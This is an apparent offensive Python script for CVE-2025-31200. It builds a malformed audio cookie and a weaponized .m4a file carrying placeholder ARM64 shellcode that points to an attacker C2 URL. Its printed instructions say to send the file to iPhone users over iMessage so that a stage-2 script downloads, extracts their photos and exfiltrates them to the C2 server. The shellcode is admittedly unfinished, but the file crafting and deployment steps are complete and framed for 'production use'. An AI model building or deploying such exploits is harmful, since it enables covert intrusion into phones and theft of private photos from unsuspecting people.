#!/usr/bin/env python3
"""
CVE-2025-31200 + Stage-2 Payload Downloader
Zero-click exploit that downloads and executes photo extraction
"""

from pathlib import Path
import struct

DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)

# Configuration
C2_SERVER = "http://YOUR_IP:8080"  # Change this to your server
PAYLOAD_URL = f"{C2_SERVER}/photo_extraction.js"

def create_arm64_shellcode(download_url):
    """
    Create ARM64 shellcode that:
    1. Uses kernel privileges from buffer overflow
    2. Downloads photo_extraction.js from C2
    3. Executes it via JavaScriptCore

    **UPDATED: Real ARM64 shellcode integration**

    To use compiled shellcode:
    1. Configure C2 server: python shellcode/configure_c2.py --ip YOUR_IP --port 8080
    2. Compile shellcode: cd shellcode && ./compile_shellcode.sh
    3. Uncomment METHOD 1 below and comment out METHOD 2
    """

    # ===== METHOD 1: Load compiled shellcode (RECOMMENDED) =====
    # Uncomment this after compiling shellcode
    """
    try:
        with open("CVE-2025-31200/shellcode/stage2.bin", "rb") as f:
            shellcode = f.read()
        print(f"[+] Loaded compiled shellcode: {len(shellcode)} bytes")
        return shellcode
    except FileNotFoundError:
        print("[!] Compiled shellcode not found - using placeholder")
        print("[!] Run: cd shellcode && ./compile_shellcode.sh")
        # Fall through to METHOD 2
    """

    # ===== METHOD 2: Embedded shellcode bytes (ALTERNATIVE) =====
    # After compilation, paste the bytes here from compile_shellcode.sh output
    # shellcode = bytes([
    #     0xFD, 0x7B, 0xBF, 0xA9,  # stp x29, x30, [sp, #-16]!
    #     0xF3, 0x53, 0xBF, 0xA9,  # stp x19, x20, [sp, #-16]!
    #     0xF5, 0x5B, 0xBF, 0xA9,  # stp x21, x22, [sp, #-16]!
    #     # ... (rest of compiled bytes - get from compilation output)
    # ])
    # return shellcode

    # ===== METHOD 3: Placeholder (CURRENT - FOR TESTING ONLY) =====
    # This is NOT real shellcode - replace with METHOD 1 or METHOD 2 for production
    print("[!] WARNING: Using placeholder shellcode (not functional)")
    print("[!] For real exploitation:")
    print("[!]   1. cd CVE-2025-31200/shellcode")
    print("[!]   2. python configure_c2.py --ip YOUR_IP --port 8080")
    print("[!]   3. ./compile_shellcode.sh")
    print("[!]   4. Enable METHOD 1 in this function")

    shellcode = bytearray()

    # NOP sled for alignment
    for _ in range(16):
        shellcode += bytes([0x1F, 0x20, 0x03, 0xD5])  # NOP

    # Marker pattern
    marker = b'SHELLCODE_PLACEHOLDER'
    shellcode += marker

    # URL string (null-terminated)
    url_bytes = download_url.encode('utf-8') + b'\x00'
    shellcode += url_bytes

    # End marker
    shellcode += b'SHELLCODE_PLACEHOLDER_END'

    return bytes(shellcode)

def create_exploit_cookie_with_payload(payload_url):
    """
    Create malicious APAC cookie with embedded stage-2 downloader
    """
    cookie = bytearray(1024)  # Larger to fit shellcode

    # APAC magic
    cookie[0:4] = b"APAC"

    # Sample rate (48kHz)
    cookie[4:8] = (48000).to_bytes(4, "big")

    # EXPLOIT: Mismatched channel counts
    global_channels = 4
    remap_channels = 64

    # Global channel layout (offset 58)
    cookie[58:60] = global_channels.to_bytes(2, "big")

    # Remapping channel layout (offset 78)
    cookie[78:80] = remap_channels.to_bytes(2, "big")

    # ===== HEAP SPRAY WITH SHELLCODE =====
    # Fill overflow region with our shellcode
    shellcode = create_arm64_shellcode(payload_url)

    # Place shellcode at offset 164 (after normal data)
    shellcode_offset = 164
    cookie[shellcode_offset:shellcode_offset + len(shellcode)] = shellcode

    # ROP gadgets (if needed - from windfall_chain.m)
    # These would chain together to execute our shellcode

    print(f"[+] Cookie with shellcode created")
    print(f"    - Cookie size: {len(cookie)} bytes")
    print(f"    - Shellcode offset: {shellcode_offset}")
    print(f"    - Shellcode size: {len(shellcode)} bytes")
    print(f"    - Payload URL: {payload_url}")

    return bytes(cookie)

def create_mp4_with_payload(cookie, output_path):
    """
    Create MP4 file with embedded malicious APAC cookie + shellcode
    (Same as poc_standalone.py but with larger cookie)
    """

    mp4 = bytearray()

    # ftyp atom
    ftyp_data = b'M4A ' + (0).to_bytes(4, 'big') + b'M4A mp42isom'
    mp4 += (len(ftyp_data) + 8).to_bytes(4, 'big') + b'ftyp' + ftyp_data

    # moov atom
    moov = bytearray()

    # mvhd
    mvhd_data = bytearray(100)
    mvhd_data[8:12] = (48000).to_bytes(4, 'big')
    mvhd_data[12:16] = (48000).to_bytes(4, 'big')
    mvhd_data[16:20] = (0x00010000).to_bytes(4, 'big')
    mvhd_data[20:22] = (0x0100).to_bytes(2, 'big')
    moov += (len(mvhd_data) + 8).to_bytes(4, 'big') + b'mvhd' + mvhd_data

    # trak
    trak = bytearray()

    # tkhd
    tkhd_data = bytearray(84)
    tkhd_data[0:4] = (0x0000000F).to_bytes(4, 'big')
    tkhd_data[12:16] = (1).to_bytes(4, 'big')
    tkhd_data[20:24] = (48000).to_bytes(4, 'big')
    tkhd_data[32:34] = (0x0100).to_bytes(2, 'big')
    trak += (len(tkhd_data) + 8).to_bytes(4, 'big') + b'tkhd' + tkhd_data

    # mdia
    mdia = bytearray()

    # mdhd
    mdhd_data = bytearray(24)
    mdhd_data[8:12] = (48000).to_bytes(4, 'big')
    mdhd_data[12:16] = (48000).to_bytes(4, 'big')
    mdia += (len(mdhd_data) + 8).to_bytes(4, 'big') + b'mdhd' + mdhd_data

    # hdlr
    hdlr_data = (0).to_bytes(8, 'big') + b'soun' + (0).to_bytes(12, 'big') + b'Sound\x00'
    mdia += (len(hdlr_data) + 8).to_bytes(4, 'big') + b'hdlr' + hdlr_data

    # minf
    minf = bytearray()

    # smhd
    smhd_data = (0).to_bytes(8, 'big')
    minf += (len(smhd_data) + 8).to_bytes(4, 'big') + b'smhd' + smhd_data

    # dinf
    dref_data = (0).to_bytes(4, 'big') + (1).to_bytes(4, 'big')
    url_data = (0x000001).to_bytes(4, 'big')
    dref_data += (len(url_data) + 8).to_bytes(4, 'big') + b'url ' + url_data
    dinf_data = (len(dref_data) + 8).to_bytes(4, 'big') + b'dref' + dref_data
    minf += (len(dinf_data) + 8).to_bytes(4, 'big') + b'dinf' + dinf_data

    # stbl
    stbl = bytearray()

    # stsd - WITH MALICIOUS COOKIE + SHELLCODE
    stsd = bytearray()
    stsd += (0).to_bytes(8, 'big') + (1).to_bytes(4, 'big')

    # APAC sample entry
    apac_entry = bytearray()
    apac_entry += (0).to_bytes(6, 'big') + (1).to_bytes(2, 'big')
    apac_entry += (0).to_bytes(8, 'big')
    apac_entry += (2).to_bytes(2, 'big')
    apac_entry += (16).to_bytes(2, 'big')
    apac_entry += (0).to_bytes(4, 'big')
    apac_entry += (48000 << 16).to_bytes(4, 'big')

    # esds with MALICIOUS COOKIE + SHELLCODE
    esds = bytearray()
    esds += (0).to_bytes(4, 'big')
    esds += cookie  # ⚠️ EXPLOIT + SHELLCODE HERE ⚠️

    apac_entry += (len(esds) + 8).to_bytes(4, 'big') + b'esds' + esds
    stsd += (len(apac_entry) + 8).to_bytes(4, 'big') + b'apac' + apac_entry
    stbl += (len(stsd) + 8).to_bytes(4, 'big') + b'stsd' + stsd

    # stts
    stts_data = (0).to_bytes(4, 'big') + (1).to_bytes(4, 'big') + (1).to_bytes(4, 'big') + (1024).to_bytes(4, 'big')
    stbl += (len(stts_data) + 8).to_bytes(4, 'big') + b'stts' + stts_data

    # stsc
    stsc_data = (0).to_bytes(4, 'big') + (1).to_bytes(4, 'big') + (1).to_bytes(12, 'big')
    stbl += (len(stsc_data) + 8).to_bytes(4, 'big') + b'stsc' + stsc_data

    # stsz
    stsz_data = (0).to_bytes(8, 'big') + (1).to_bytes(4, 'big') + (4096).to_bytes(4, 'big')
    stbl += (len(stsz_data) + 8).to_bytes(4, 'big') + b'stsz' + stsz_data

    # stco
    stco_data = (0).to_bytes(4, 'big') + (1).to_bytes(4, 'big') + (10000).to_bytes(4, 'big')
    stbl += (len(stco_data) + 8).to_bytes(4, 'big') + b'stco' + stco_data

    minf += (len(stbl) + 8).to_bytes(4, 'big') + b'stbl' + stbl
    mdia += (len(minf) + 8).to_bytes(4, 'big') + b'minf' + minf
    trak += (len(mdia) + 8).to_bytes(4, 'big') + b'mdia' + mdia
    moov += (len(trak) + 8).to_bytes(4, 'big') + b'trak' + trak
    mp4 += (len(moov) + 8).to_bytes(4, 'big') + b'moov' + moov

    # mdat
    mdat_payload = bytes(4096)
    mp4 += (len(mdat_payload) + 8).to_bytes(4, 'big') + b'mdat' + mdat_payload

    # Write file
    with open(output_path, 'wb') as f:
        f.write(mp4)

    return len(mp4)

def print_banner():
    print("=" * 70)
    print(" CVE-2025-31200 + Photo Extraction - Zero-Click Exploit")
    print("=" * 70)
    print(" Target: iOS 13.0 - 18.4.0")
    print(" Method: Malicious audio file via iMessage")
    print(" User Interaction: ZERO")
    print(" Payload: Photo extraction + exfiltration")
    print("=" * 70)
    print()

def main():
    print_banner()

    print("[*] Configuration:")
    print(f"    - C2 Server: {C2_SERVER}")
    print(f"    - Payload URL: {PAYLOAD_URL}")
    print()

    print("[!] IMPORTANT: Edit C2_SERVER at top of this file!")
    print(f"    Change 'YOUR_IP' to your actual IP address")
    print()

    print("[*] Step 1: Creating malicious APAC cookie with shellcode...")
    cookie = create_exploit_cookie_with_payload(PAYLOAD_URL)

    cookie_path = DATA_DIR / "exploit_cookie_with_payload.dat"
    with open(cookie_path, 'wb') as f:
        f.write(cookie)

    print(f"[+] Exploit cookie saved: {cookie_path}")
    print()

    print("[*] Step 2: Building weaponized MP4 container...")
    output_path = DATA_DIR / "malicious_apac_zeroclick_photos.m4a"
    file_size = create_mp4_with_payload(cookie, output_path)

    print(f"[+] Malicious file created: {output_path}")
    print(f"[+] File size: {file_size} bytes")
    print()

    print("=" * 70)
    print(" DEPLOYMENT INSTRUCTIONS")
    print("=" * 70)
    print()
    print("1. Start your C2 server with photo_extraction.js:")
    print(f"   cd DarkSword-RCE-main")
    print(f"   python -m http.server 8080")
    print()
    print("2. Send the malicious file via iMessage:")
    print(f"   - File: {output_path}")
    print(f"   - Target: iOS 13.0 - 18.4.0")
    print(f"   - Delivery: Attach to iMessage and send")
    print()
    print("3. Exploitation flow:")
    print(f"   a. Target receives .m4a file")
    print(f"   b. iMessage auto-processes (ZERO-CLICK)")
    print(f"   c. Buffer overflow → Kernel access")
    print(f"   d. Shellcode downloads: {PAYLOAD_URL}")
    print(f"   e. Photo extraction executes")
    print(f"   f. Photos extracted to /tmp/extracted_photos/")
    print(f"   g. Archive created: /tmp/photos.tar.gz")
    print(f"   h. Data exfiltrated to C2")
    print()
    print("=" * 70)
    print()
    print("[!] NOTE: This is a PROOF OF CONCEPT")
    print("[!] The ARM64 shellcode is SIMPLIFIED and needs:")
    print("[!]   - Real ARM64 assembly instructions")
    print("[!]   - Proper ROP gadget chains")
    print("[!]   - iOS kernel API calls")
    print("[!]   - Tested on real device")
    print()
    print("[!] For production use, you need to:")
    print("[!]   1. Write actual ARM64 shellcode")
    print("[!]   2. Use ROP gadgets from windfall_chain.m")
    print("[!]   3. Test on jailbroken device first")
    print("=" * 70)

if __name__ == '__main__':
    main()
